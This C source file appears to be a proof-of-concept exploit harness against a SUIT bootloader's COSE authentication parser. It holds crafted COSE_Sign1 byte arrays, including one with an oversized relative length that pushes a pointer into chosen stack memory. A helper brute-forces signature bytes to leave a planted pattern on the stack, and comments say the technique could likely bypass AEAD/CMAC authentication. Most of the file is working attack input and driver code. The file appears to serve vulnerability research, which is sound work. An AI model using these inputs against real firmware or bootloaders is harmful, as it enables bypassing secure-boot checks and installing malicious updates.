#include "stubs.h"
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "suit_bootloader.h"
#include "suit_parser.h"

uint8_t cose_auth_bstr_first[] = {
0x58, 0x70,   // Byte string

0x81, // Single element array

0xD2,  // Sing 1

0x84, // 4 element array

0x43,0xA1,0x01,0x26,  // Pheader (algoiId)

0xA0,  // Uheader - empty map

// HASH
0x58,
0x24,

// Payload - AlgId + Hash
0x82,0x02,0x58,0x20,
// The hash of malicious input
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,

// Signature
// The payload (s) is selected to result in a specific byte pattern preceding
// the Rx variable
0x58,0x40,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0x22,
};


uint8_t cose_auth_bstr_second[] = {
0x58, 0x70,   // Byte string

0x81, // Single element array

0xD2,  // Sing 1

0x84, // 4 element array

0x43,0xA1,0x01,0x26,  // Pheader (algoiId)

0xA0,  // Uheader - empty map

0x5B,

// THE RELATIVE OFFSET
// Depending on the target architecture pointer size it may need to be of different length
// Below a 64-bit pointer math assumed
// This valueu is crucial to force the input variable to point to selected area in the 
// stack space
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFD, 0x4B,

// Payload - AlgId + Hash
0x82,0x02,0x58,0x20,
// hash
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,

// Signature
0x58,0x40,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
0x40,0x58,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
};

void prepare()
{
	uint8_t buffer[1024];
	uint64_t ii;
	memset(buffer, 0x58, sizeof(buffer));
}

/* A helper function to find the s value that will result in desired
 * bytes preceeding rx on the stack.
 *
 */
void helper_find_the_s()
{
    uint32_t round = 0;
    uint8_t auth_buffer[512];

    for (round = 0; round < 256; round++)
    {
    	prepare();
    	memcpy(auth_buffer, cose_auth_bstr_first, sizeof(cose_auth_bstr_first));
    	auth_buffer[sizeof(cose_auth_bstr_first) -1] = (uint8_t)round;
    	do_cose_auth(
    	    auth_buffer,
    	    NULL,
    	    0);
    }
}

/* Fun exercise to force the parser to load previously computed output
 * from stack.
 * In case of ECDSA the signature verification process is still 
 * safe as long as there is no way to trick the hash input to be set to 
 * a value of hash of input of the attakers choice.
 * 
 * I this was an AEAD/CMAC authentication implemented, there would be a very high
 * likelyhood of bypassing authentication by using this technique.
 */

int main(int argc, char *argv[]) 
{
    int result_code = 0;
    uint8_t auth_buffer[512];
    //helper_find_the_s();
    memcpy(auth_buffer, cose_auth_bstr_first, sizeof(cose_auth_bstr_first));
    prepare();

    /* Pass the input to verification function. */
    /* First run - expected to fail*/
    result_code = do_cose_auth(
    auth_buffer,
    NULL,
    0);

    memcpy(auth_buffer, cose_auth_bstr_second, sizeof(cose_auth_bstr_second));
    /* Second run - get the inverted signature on stack. */
    result_code = do_cose_auth(
    auth_buffer,
    NULL,
    0);

    return 0;
}
